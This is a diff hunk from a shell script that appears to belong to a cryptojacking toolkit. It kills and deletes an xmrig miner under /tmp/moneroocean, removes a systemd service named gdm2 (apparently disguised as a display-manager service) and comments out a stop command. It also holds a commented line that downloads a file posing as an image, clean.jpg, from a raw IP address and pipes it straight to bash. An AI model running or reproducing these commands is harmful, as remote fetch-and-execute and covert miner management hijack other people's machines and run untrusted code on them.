@@ -19,7 +19,7 @@ pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
 rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
 killall -9 xmrig 2>/dev/null 1>/dev/null
 
-systemctl stop gdm2
+#systemctl stop gdm2
 rm -rf /etc/systemd/system/gdm2.service
 
 #$(curl http://129.211.98.236/ps/clean.jpg | bash || wget -O - http://129.211.98.236/ps/clean.jpg| bash)
